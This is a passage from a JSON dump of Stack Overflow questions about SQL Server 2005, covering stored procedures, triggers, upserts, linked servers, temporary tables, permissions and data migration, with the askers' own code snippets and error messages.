baseed on the date the file was created, so a worksheet name would be 20120911. </p>\n\n<p>I want to standardize the worksheet name by automatically changing it. </p>\n\n<p>Is this possible? I've done a lot of searching but haven't found a solution. \nThanks. </p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":355,"score":0,"question_id":6741926,"title":"Applying sp_msforeachtable for selected tables","body":"<p>I have a problem in updating some column values in a table. In my database there are many tables and out of which I have to update those tables which is having a column by the name \"Col1\".</p>\n\n<p>If I do</p>\n\n<pre><code>exec sp_msforeachtable 'UPDATE ? SET Col1=\n\ncase when Col1 = \"ppp\" then \"qqq\"\n     when Col1 = \"aaa\" then  \"xxx\" \nend\n' \n</code></pre>\n\n<p>It will report  an error message as</p>\n\n<p><strong>Msg 207, Level 16, State 1, Line 1\nInvalid column name 'col1'.</strong></p>\n\n<p>What to do?</p>\n"},{"tags":["sql-server-2005","pervasive"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12426605,"title":"Pervasive 9 - Export very large tables","body":"<p>I'm looking for some guidance on exporting very large amounts of data for a migration project from pervasive 9 to a SQL databse.  By very large I'm talking row counts in excess of 10 million.</p>\n\n<p>The throughput of import/export in ssis seems slow to me, so I'm wondering if anyone has domain experience with pervasive and has some performance tips.</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":7099,"score":3,"question_id":1175244,"title":"SQL Server error on update command - \"A severe error occurred on the current command\"","body":"<p>Running the following query in SQL Server Management Studio gives the error below.</p>\n\n<pre><code>update table_name set is_active = 0 where id  = 3\n</code></pre>\n\n<blockquote>\n  <p>A severe error occurred on the current command.  The results, if any, should be discarded.</p>\n</blockquote>\n\n<ul>\n<li>The logs have been truncated</li>\n<li>there is an update trigger but this isnt the issue</li>\n<li>the transaction count is zero  (@@trancount)</li>\n</ul>\n\n<p>I have tried the same update statement on a couple of other tables in the database and they  work fine.</p>\n\n<pre><code>DBCC CHECKTABLE('table_name');\n</code></pre>\n\n<p>gives</p>\n\n<pre><code>DBCC results for 'table_name'.\nThere are 13 rows in 1 pages for object \"table_name\".\nDBCC execution completed. If DBCC printed error messages, contact your system administrator.\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2244,"score":0,"question_id":1278622,"title":"A severe error occurred on the current command.  The results, if any, should be discarded","body":"<p>I'm getting an error using SQL Server 2005 stored procedure.</p>\n\n<blockquote>\n  <p>A severe error occurred on the current command.  The results, if any, should be discarded.\"</p>\n</blockquote>\n\n<p>I have a stored proc which saves a record. As far as I can tell this error gets thrown when that procedure gets called too many times in quick succession, or maybe simultaneously by different threads</p>\n\n<p>The proc is very simple, it does a BEGIN TRY.. BEGIN TRAN... IF NOT EXISTS INSERT .. ELSE UPDATE .. COMMIT TRAN .. END TRY</p>\n\n<p>No SQLDUMP file gets created, and nothing gets written into ERRORLOG.</p>\n\n<p>It is a Severity 11 error. The SqlException does not contain State or Number</p>\n\n<p>SQL Server 2005 SP3 (9.00.4035)</p>\n\n<p>How can this be fixed?</p>\n"},{"tags":["sql-server-2005","diagram","restore"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":124,"score":1,"question_id":2725974,"title":"SQL 2005 - any way to restore/copy a diagram?","body":"<p>I used the Redgate packager (ran MSI) to reset all the data in my database (i.e. I deleted everything, and let it build the new database).  Unfortunately, I discovered that it didn't retain my diagrams, which has a nice arrangement and several annotations.  </p>\n\n<p>Is there any way to copy/migrate/script the diagram from one database to another (the databases have identical structures). </p>\n\n<p>Thanks,\nNeal Walters </p>\n"},{"tags":["sql-server-2005","oracle9i","dbmigrate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":188,"score":0,"question_id":3571695,"title":"Convertion from Sql server 2005 to Oracle 9i","body":"<p>I have devloped website using ASP and Sql Server 2005. I have not used any Stored Procedure and Views [All the queries are passed from the asp page]. Now i need to convert the database from SQL Server 2005 to Oracle 9i. </p>\n\n<p>Will it takes huge changes in my code? Is there any tool to convert Sql Server 2005 query to Oracle query?</p>\n"},{"tags":["sql-server","sql-server-2005","database-permissions","database-mail"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4132,"score":2,"question_id":5569511,"title":"How to give access to SQL Server database mail procedures for a Login in a different database?","body":"<p>I'd like to know how to set up permissions within SQL Server to allow my application Login/Role to be able to send email using <code>msdb.dbo.sp_send_dbmail</code>.</p>\n\n<p>I have a database MyDb, a user <code>MyUser</code> who is a member of role <code>AppRole</code>. I have a stored procedure <code>myProc</code> that calls <code>msdb.dbo.sp_send_dbmail</code>. If I execute <code>myProc</code> while logged in as <code>sa</code> it all works fine, but if I execute while logged in as <code>MyUser</code> I get an error: </p>\n\n<blockquote>\n  <p>Msg 229, Level 14, State 5, Procedure sp_send_dbmail, Line 1<br>\n  The EXECUTE permission was denied on the object 'sp_send_dbmail', database 'msdb', schema 'dbo'.</p>\n</blockquote>\n\n<p>My database does not have TRUSTWORTHY ON, therefore I believe I <strong>can't</strong> use EXECUTE AS to impersonate a different user, e.g. create myProc with EXECUTE AS OWNER... (<a href=\"http://msdn.microsoft.com/en-us/library/ms188304.aspx\" rel=\"nofollow\">MSDN reference</a>)</p>\n\n<p>Therefore I think I need to make my user(s) also users within msdb, but can I do this at the Role level or do I need to make each of my database users also users in msdb? </p>\n\n<p>The database mail profile that I'm using is set to public, so I don't think this is related to the profile permissions.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":517,"score":0,"question_id":8575159,"title":"Inserting large amount of data into SQL Server 2005 table","body":"<p>I am inserting around 2 million records into a SQL Server 2005 table. The table currently have clustered as well as non-clustered indexes. I want to improve the performance of the insert query in that table . Can anyone have idea about </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":4,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":3429,"score":4,"question_id":5599874,"title":"How can I check for duplicates before inserting into a table when inserting by select","body":"<p>How can I check for duplicates before inserting into a table when inserting by select:</p>\n\n<pre><code>insert into table1\nselect col1, col2 \nfrom table2\n</code></pre>\n\n<p>I need to check if table1 already has a row with table1.col1.value = table2.col1.value, and if yes, then exclude that row from the insert.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":89,"score":1,"question_id":12421760,"title":"Sql query to sort numbers & to get output as 1.1.1,1.1.2,1.1.3","body":"<p>I want sql query to get output as </p>\n\n<p><code>1.1.1,1.1.2,1.1.3...</code></p>\n\n<p>I tried order by clause but I am getting result as <code>1.1.1,1.1.10,1.1.11,1.1.2,1.1.3...</code></p>\n\n<p>My procedure is:</p>\n\n<pre><code>select * \n  from Projects,\n where iId in (select value \n                 from ParmsToList(@projectid,',')\n              )\n   And Projects.categoryid  &gt; 0\n order by Projects.vProjectName\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12420040,"title":"linking row with a column in sql server","body":"<p>I am trying to get a resultset using two tables</p>\n\n<ol>\n<li>Trail Balance</li>\n<li>Aging</li>\n</ol>\n\n<p>the structure of the tables are</p>\n\n<p><strong>Aging</strong></p>\n\n<pre><code>loc    |    glAcct    |    Amount\n-----------------------------------\n1013   |     1101     |    200\n-----------------------------------\n1211   |     1102     |    300\n-----------------------------------\n</code></pre>\n\n<p><strong>Trial Balance</strong></p>\n\n<pre><code>loc   |    g1101    |   g1102\n------------------------------\n1013  |     20      |    30\n------------------------------\n1211  |     10      |    40\n-----------------------------\n</code></pre>\n\n<p>now what i am trying to do is to match the rows with the columns \nwhat i want now is </p>\n\n<pre><code>loc   |   glAcct    |    agigingAmount |  Trialbalance Amount\n--------------------------------------------------------------\n1013  |     1101    |      200         |        20\n--------------------------------------------------------------\n1211  |     1102    |      300         |        40\n-------------------------------------------------------------     \n</code></pre>\n\n<p>i have tried case statements like</p>\n\n<pre><code>select ag.loc,ag.glAcct,\ncase\n   when ag.glAcct = '1101' then select g1101 from trialbalance \n   when ag.glAcct = '1102' then select gl101 from trialbalance \nend  \n\n from trialbalance tb,Aging ag where ag.loc = tb.loc\n</code></pre>\n\n<p>but its not working.</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12419330,"title":"How to create indexed view with select distinct statement in sql 2005","body":"<p>My view named \"Ge_Entry\" is running very very slow so want to create indexed view with select distinct statement but sql server not allowing it.</p>\n\n<p>So i want to know is there any way to create i.view with s.dist statement.</p>\n\n<p>So that i can create indexes on this view for fast results.</p>\n\n<p>Thanx</p>\n\n<p>Neel</p>\n"},{"tags":["visual-studio-2010","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12412369,"title":"Error Deploy01234: on VS 2010 with SQL server 2005","body":"<p>When trying to deploy my solution I receive the message for error Deploy01234. I am able to connect to my database which is located on my machine. When I test the connection it succeeds. When I go to build the solution it succeeds. I've looked up just about everything I can on google, and SO. I'm new to SQL server so I'm sure this is a config error. I am only trying to run the db solution on my machine for testing. I'm not deploying this to azure.</p>\n\n<p>Here is what it's throwing: </p>\n\n<blockquote>\n  <p>C:\\Program Files\n  (x86)\\MSBuild\\Microsoft\\VisualStudio\\v10.0\\TeamData\\Microsoft.Data.Schema.TSqlTasks.targets(120,5):\n  Error Deploy01234: The target database schema provider could not be\n  determined.  Deployment cannot continue.    Done executing task\n  \"SqlDeployTask\" -- FAILED.   Done building target \"DspDeploy\" in\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED.  Done executing\n  task \"CallTarget\" -- FAILED. Done building target \"DBDeploy\" in\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED. Done building\n  project \"Prescient.RView.FDIC.Db.dbproj\" -- FAILED.</p>\n  \n  <p>Build FAILED.\n  ========== Build: 1 succeeded or up-to-date, 0 failed, 0 skipped ==========\n  ========== Deploy: 0 succeeded, 1 failed, 0 skipped ==========</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":178,"score":0,"question_id":12419132,"title":"How to trigger before INSERT statement in stored procedure in SQL Server 2005?","body":"<p>I read this <a href=\"http://stackoverflow.com/questions/6102288/help-with-sql-server-trigger-to-truncate-bad-data-before-insert\">Help with SQL Server Trigger to truncate bad data before insert</a> but not solve my issue when is about stored procedure.</p>\n\n<p><strong>update</strong></p>\n\n<p>Because of my issue <a href=\"http://stackoverflow.com/questions/12407728/why-cannot-create-global-temporary-table-or-truncate-it-when-call-a-stored-proce\">Why cannot create global temporary table or truncate it when call a stored procedure from C# code?</a> when truncate table from stored procedure when it is called from C# code.</p>\n\n<p><strong>end update</strong></p>\n\n<p>The stored procedure is</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[aProcedure]\n  @val1 VARCHAR(255),\n  @val2 VARCHAR(255),\n  ...\nAS \nBEGIN\n   SELECT @sql = '//Do SELECT statement'\n\n    INSERT INTO dbo.MyTable(....)\n\n    SELECT @paramList = ' /*list of parameters*/';\n\n    EXEC sp_executesql @sql, @paramList, ... parameters\nEND\n</code></pre>\n\n<p>And the trigger I used (I'm beginner in SQL)</p>\n\n<pre><code>CREATE TRIGGER MyTrigger ON dbo.MyTable\nFOR INSERT\nAS\nBEGIN\n    TRUNCATE dbo.MyTable\nEND\n</code></pre>\n\n<p>How do trigger, <strong>when from stored procedure the values are inserted into <code>dbo.MyTable</code></strong>, which truncate my table first and after that make <code>INSERT</code> operation ?</p>\n\n<p>I read the documentation from <a href=\"http://msdn.microsoft.com/en-us/library/aa258254%28v=sql.80%29.aspx\" rel=\"nofollow\">MSDN</a> and <a href=\"http://www.codeproject.com/Articles/38808/Overview-of-SQL-Server-database-Triggers\" rel=\"nofollow\">CodeProject</a>.</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server-2005","jsp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12418592,"title":"Add column in sql server 2005","body":"<p>I am using SQL Server 2005 and JSP. I want to add column having name as string object value.</p>\n\n<pre><code>String dr=\"Doctor1\";\n\nstat1=conn.createStatement();\nstat1.executeUpdate(\"ALTER TABLE dbo.PHPL ADD '\"+dr+\"' NVARCHAR(255) Null\");\n</code></pre>\n\n<p>It is giving error near column name.I think I am mistaking with syntax. Please help.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12293803,"title":"How to insert data to database in another server?","body":"<p>I am using Sql Server 2005.<br>\nThere are two different Sql Servers.<br>\nI need to get data from one server and insert them into database on other server.<br>\nAs a example assume there is two servers call A and B.<br>\nA has DB call ADB and B has DB call BDB.<br>\nI need to get data from ADB and insert them into BDB.</p>\n\n<p>Any suggestion?</p>\n"},{"tags":["sql","tsql","sql-server-2005","linked-server"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":55,"score":3,"question_id":12418044,"title":"How to run T-SQL in another DB server?","body":"<p>I want to select some data form another database in another server.</p>\n\n<p>What I know is add a Linked Server, and run the T-SQL.</p>\n\n<p>Is this way is a good choice, or is there any other way to run SQL in other database servers?</p>\n\n<p>thanks.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12415715,"title":"TSQL => Take the time from the datetime and convert it into seconds?","body":"<p>I am running SQL Server 2005.  Technically I know how to take the time from a tsql datetime.</p>\n\n<pre><code>CONVERT(VARCHAR(8),GETDATE(),108) AS HourMinuteSecond\n</code></pre>\n\n<p>The problem is that I have a datetime field and I need to essentially grab the time portion convert that to an integer specifically seconds.  Then I need to do a bunch of arithmetic on this integer that I won't discuss here.  I have searched on stackoverflow and haven't found a question that is specific to this question.  Any ideas?  I am really looking for best practices here, I am worried about creating a udf for this specific purpose as it completely throws the query optimizer out the window.</p>\n\n<p>I have seen this webpage so please don't paste this. :</p>\n\n<p><a href=\"http://forums.devx.com/showthread.php?171561-TSQL-Converting-HH-MM-SS-to-seconds\" rel=\"nofollow\">http://forums.devx.com/showthread.php?171561-TSQL-Converting-HH-MM-SS-to-seconds</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":259,"score":1,"question_id":4016876,"title":"How to dynamically choose which table (with same schema) to select from in stored procedure","body":"<p>I have a bit of an odd database model for a project - I'm going to have several tables with the same definition.  Each table stores information for different clients and because of security restrictions, we cannot put the data together in one table.  So it would look something like this...</p>\n\n<pre><code>\ntable ClientOneData\n(\n    Id (PK, int, not null),\n    Col1 (varchar(50), not null),\n    etc.\n)\n\ntable ClientTwoData\n(\n    Id (PK, int, not null),\n    Col1 (varchar(50), not null),\n    etc.\n)\n</code></pre> \n\n<p>I want a single stored procedure to retrieve data from the appropriate table. I could do that by just passing the table name as a param to the proc and then building up a string of sql to execute...</p>\n\n<pre><code>\nCREATE PROCEDURE GetData\n    @TableName varchar(100)\n\nAS\nBEGIN\n\n    DECLARE @sql varchar(max)\n    SET @sql = 'SELECT * FROM ' + @sql\n\n    exec(@sql)\n</code></pre>\n\n<p>... but that seems fundamentally wrong to me.  And replicating code, either in the form of a giant case statement or by \"one-offing\" the proc and creating a new one for each client, also seems wrong.</p>\n\n<p>Is there a better way to do this? </p>\n\n<p>I'm pretty open to suggestions, anything from something I can do in the proc to re-working the data model (short of dumping all the data into a single table).  Upgrading to SQL-Server 2008 or 2010 <em>might</em> be an option, but would be a last resort.</p>\n"},{"tags":["sql","tsql","sql-server-2005","week-number","datepart"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12411185,"title":"convert week datepart number to date within week (week of...)","body":"<p>I am trying to figure out how to convert a datepart for a week to the Monday of that week.</p>\n\n<p>I am using this: </p>\n\n<pre><code>     datepart(ww, DateCompleted) as week \n</code></pre>\n\n<p>to group a set of orders in our system by week.  My goal is for this to say instead of 37, i want it to return the Monday of week 37, i.e.: 09-10-2012.  I am able to do this by defining each week per number but i would rather not spend so much time typing out each week when there is probably a better option out there, i have just been unable to find it anywhere online other than in MySQL and other programming languages (i need T-SQL please, or anything that will work on sql server 2005), and i do not know how to work with that.  Thanks for anyone that can help. Ill be checking back as often as possible to provide more info if needed.</p>\n"},{"tags":["sql-server-2005","scalability","high-availability"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12408316,"title":"Service reachability, scalability, availability","body":"<p>I have the following system\nRIA client&lt;-->online MS SQL server , but online works when there is full internet availability.</p>\n\n<p>I want something such as \nRIA client&lt;-->local low footprint db server&lt;-->online MS SQL server\nThis is to improve the service reachability, scalability, and availability</p>\n\n<p>What technique can used to make sure the reads and write to the online server are buffered from the offline server installed on a client?</p>\n\n<p>I found a <a href=\"http://technet.microsoft.com/library/ms166367.aspx\" rel=\"nofollow\">replication technique</a>, but want to know if a simpler solution is possible. Another technique is quite in research: <a href=\"http://www.computer.org/portal/web/csdl/doi/10.1109/SERVICES.2010.69\" rel=\"nofollow\">http://www.computer.org/portal/web/csdl/doi/10.1109/SERVICES.2010.69</a></p>\n"},{"tags":["c#","sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":12407728,"title":"Why cannot create global temporary table or truncate it when call a stored procedure from C# code?","body":"<p>I spent whole days and hours to investigate why cannot create temporary table when I call a stored procedure from C# code.</p>\n\n<p>Let's assume a piece of C# code:</p>\n\n<pre><code>public void GetDataByFilter(string item, string filter ...) {\n   ... \n   // provide stored procedure in new SqlCommand object\n   sqlCommand.CommandType = CommandType.StoredProcedure;\n\n   sqlCommand.Parameters.Add(\"@val1\", aValue1);\n   sqlCommand.Parameters.Add(\"@val2\", aValue2);\n   ...\n   while(sqlDataReader.Read()) { /* process info here */ }\n}\n</code></pre>\n\n<p>and my stored procedure</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[aProcedure]\n  @val1 VARCHAR(255),\n  @val2 VARCHAR(255),\n  ...\nAS \nBEGIN\n  IF OBJECT_ID(N'tempdb..##aTempTable') IS NULL\n    CREATE TABLE tempdb..##aTempTable (\n          id1 INT,\n              id2 INT,\n              id3 VARCHAR(255),\n              ...\n    )\n\nELSE \n    TRUNCATE TABLE tempdb..##aTempTable\n\n    -- insert information into this table\n    SELECT @paramList = ' /*list of parameters*/';\n\n    EXEC sp_executesql @sql, @paramList, ... parameters\nEND\n</code></pre>\n\n<p>In C# code, in <strong>another function</strong>, I provided </p>\n\n<pre><code>sqlCommand.CommandText = \"SELECT * FROM tempdb..##aTempTable\";\n</code></pre>\n\n<p>But exception was thrown that <code>tempdb..##aTemTable</code> doesn't exists.</p>\n\n<p>If I execute stored procedure inside SSMS (Sql Server Management Studio) then the table is created.</p>\n\n<p>The problem is also for <code>TRUNCATE TABLE</code> operation <strong>not only</strong> for <code>CREATE TABLE</code>.</p>\n\n<p>I need temporary global table for to be used into different stored procedures accordingly with <a href=\"http://stackoverflow.com/questions/12312903/it-is-possible-for-created-temporary-table-by-a-stored-procedure-to-be-used-in-a\">It is possible for created temporary table by a stored procedure to be used in another stored procedure?</a>.</p>\n\n<p>Any solution ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":6544,"score":3,"question_id":6309541,"title":"How do I convert a number to a numeric, comma separated, formatted string?","body":"<p>Is there an easy way to convert a number (in my case an integer) to a comma separated <code>nvarchar</code> string?</p>\n\n<p>For instance, if I had an <code>int</code> value of 1000000 stored in a field, how can I convert to an <code>nvarchar</code> string, with the output value of \"1,000,000\"?</p>\n\n<p>I could easily write a function to do this but I wanted to be sure there wasn't an easier way involving a call to either <code>CAST</code> or <code>CONVERT</code>.</p>\n"},{"tags":["sql-server","sql-server-2005","atomic","upsert"],"answer_count":5,"favorite_count":11,"up_vote_count":26,"down_vote_count":0,"view_count":6536,"score":26,"question_id":2522379,"title":"Atomic UPSERT in SQL Server 2005","body":"<p>What is the correct pattern for doing an atomic \"UPSERT\" (UPDATE where exists, INSERT otherwise) in SQL Server 2005?</p>\n\n<p>I see a lot of code on SO (e.g. see <a href=\"http://stackoverflow.com/questions/639854/tsql-check-if-a-row-exists-otherwise-insert\">http://stackoverflow.com/questions/639854/tsql-check-if-a-row-exists-otherwise-insert</a>) with the following two-part pattern:</p>\n\n<pre><code>UPDATE ...\nFROM ...\nWHERE &lt;condition&gt;\n-- race condition risk here\nIF @@ROWCOUNT = 0\n  INSERT ...\n</code></pre>\n\n<p>or</p>\n\n<pre><code>IF (SELECT COUNT(*) FROM ... WHERE &lt;condition&gt;) = 0\n  -- race condition risk here\n  INSERT ...\nELSE\n  UPDATE ...\n</code></pre>\n\n<p>where &lt; condition > will be an evaluation of natural keys.  None of the above approaches seem to deal well with concurrency.  If I cannot have two rows with the same natural key, it seems like all of the above risk inserting rows with the same natural keys in race condition scenarios.</p>\n\n<p>I have been using the following approach but I'm surprised not to see it anywhere in people's responses so I'm wondering what is wrong with it:</p>\n\n<pre><code>INSERT INTO &lt;table&gt;\nSELECT &lt;natural keys&gt;, &lt;other stuff...&gt;\nFROM &lt;table&gt;\nWHERE NOT EXISTS\n   -- race condition risk here?\n   ( SELECT 1 FROM &lt;table&gt; WHERE &lt;natural keys&gt; )\n\nUPDATE ...\nWHERE &lt;natural keys&gt;\n</code></pre>\n\n<p>Note that the race condition mentioned here is a different one from the ones in the earlier code.  In the earlier code, the issue was phantom reads (rows being inserted between the UPDATE/IF or between the SELECT/INSERT by another session).  In the above code, the race condition has to do with DELETEs.  Is it possible for a matching row to be deleted by another session AFTER the (WHERE NOT EXISTS) executes but before the INSERT executes?  It's not clear where the WHERE NOT EXISTS puts a lock on anything in conjunction with the UPDATE.</p>\n\n<p>Is this atomic?  I can't locate where this would be documented in SQL Server documentation.</p>\n\n<p><strong>EDIT:</strong>  I realise this could be done with transactions, but I think I would need to set the transaction level to SERIALIZABLE to avoid the phantom read problem?  Surely that is overkill for such a common problem?</p>\n"},{"tags":["sql-server-2005","nhibernate"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":552,"score":4,"question_id":477146,"title":"NHibernate elt field","body":"<p>Does anyone know why NHibernate generates a field named 'elt' of type int for a many to many mapping?\nI'm wondering why I need it.\nThanks</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12399415,"title":"Sending a column name and values as Parameter in stored procedure","body":"<p>I want to update an entry in Stored Procedure with the column name and column value that I pass as parameter, how can I do it.</p>\n"},{"tags":["c#","sql-server","sql-server-2005","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":102,"score":3,"question_id":12374488,"title":"Is it possible to access SQL Server Service Broker from a C# app?","body":"<p>I want to use the SQL Server Service Broker to generate a message (inside SQL Server) and for it to be read in an external C# app.</p>\n\n<p>I am limited to Windows 2003 running SQL Server 2005. I've read a bunch of articles, that allude to this being a possibility, but I do not see an example anywhere. Is this possible?</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12381960,"title":"How to lock MyDatabase in SQL Server 2005?","body":"<p>In my earlier question i asked how to change SQL SERVER from Windows Authentication to SQL Authentication, with the help of answers was able to successfully change it.</p>\n\n<p>However, my issue was that to protect MyDatabase from others so that no one can modify it, apart from me. As I have change it to SQL Auth, still i can see MyDatabase in both Auths.</p>\n\n<p>So is there any way I can do that, if yes then please let me know what all changes do I need to make in my Connection class to successfully create a connection.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","union"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12399281,"title":"Select from union tsql","body":"<p>Is it possible to select from the result of a union?  For example I'm trying to do something like:</p>\n\n<pre><code>SELECT A\nFROM\n(\n    SELECT A, B FROM TableA\n    UNION\n    SELECT A, B FROM TableB\n)\nWHERE B &gt; 'some value'\n</code></pre>\n\n<p>Am I missing anything or making an assumption about how this works?  I'm using MSSQL 2005 so any solution will need to conform to what I can do there.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":226,"score":4,"question_id":12394331,"title":"Display top n records and consolidate the rest of the rows","body":"<p>I am relatively new to writing SQL. I have a requirement where I have to display the top 5 records as it is and consolidate the rest as 1 single record and append it as the 6th record. I know top 5 selects the top 5 records, but I am finding it difficult to put together a logic to consolidate the rest of the records and append it at the bottom of the result set.</p>\n\n<pre><code>weekof          sales    year    weekno\n-------------------------------------------------------------\n07/01 - 07/07   2   2012    26  \n07/08 - 07/14   2   2012    27  \n07/29 - 08/04   1   2012    30  \n08/05 - 08/11   1   2012    31  \n08/12 - 08/18   32  2012    32  \n08/26 - 09/01   2   2012    34  \n09/02 - 09/08   8   2012    35  \n09/09 - 09/15   46  2012    36   \n09/16 - 09/22   26  2012    37\n</code></pre>\n\n<hr>\n\n<p>I want this to be displayed as</p>\n\n<pre><code>weekof          sales\n----------------------\n09/16 - 09/22   26  \n09/09 - 09/15   46  \n09/02 - 09/08   8   \n08/26 - 09/01   2   \n08/12 - 08/18   32  \n07/01 - 08/11   6\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","maintenance-plan"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1809,"score":0,"question_id":5668745,"title":"Maintenance plan maintenance cleanup task running successfully, but not deleting files?","body":"<p>This has been driving me crazy. I have tried all suggestions and no go.</p>\n\n<p>This absolutely does not work. The files are all still there.</p>\n\n<p>The job runs successfully, but the files do not delete.</p>\n\n<p><img src=\"http://i.stack.imgur.com/cH86L.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12390612,"title":"How to assign ROW_NUMBER() to a column?","body":"<p>After reading <a href=\"http://stackoverflow.com/questions/1293390/sql-to-output-line-number-in-results-of-a-query\">this question</a>, I have another similar question. Is there a simple way to get this SQL statement to work?</p>\n\n<pre><code>update [Insurances] set [RowNo]=ROW_NUMBER() over (order by [RowNo])\n</code></pre>\n\n<p>I have a <code>RowNo</code> column which I want to update whenever a record is deleted.</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12390140,"title":"Why if I select `Open Table` for temporary global table doesn't work in SQL Server 2005?","body":"<p>I have an issue in Management Studio Express 2005.</p>\n\n<p>If I select <code>Open Table</code> for a temporary global table:</p>\n\n<p><img src=\"http://i.stack.imgur.com/IVQGV.png\" alt=\"enter image description here\"></p>\n\n<p>Not works, the error appears:</p>\n\n<p><img src=\"http://i.stack.imgur.com/m9Wzc.png\" alt=\"enter image description here\"></p>\n\n<p>But if I write</p>\n\n<pre><code>SELECT * FROM dbo.##tempResults\n</code></pre>\n\n<p>then the table content will appears.</p>\n\n<p><img src=\"http://i.stack.imgur.com/dFWQX.png\" alt=\"enter image description here\"></p>\n\n<p>There are any fix for this problem ?</p>\n\n<p>I have SP4 for Management Studio.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12389643,"title":"osql.exe can't read special characters","body":"<p>Hi I am trying to make some update using osql.exe against a sql file which has some special characters.\nBut the actual update ends up having some funny characters instead of the special characters.\nSample sql is below:</p>\n\n<pre><code>  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'CA', 3, N'Automàtic')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'CS', 3, N'Automatický')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'DA', 3, N'Automatgear')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'DE', 3, N'Automatik')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'EL', 3, N'Αυτόματο')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'EN', 3, N'Automatic')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'ES', 3, N'Automático')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'FR', 3, N'Automatique')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'HU', 3, N'Automata')\n  INSERT 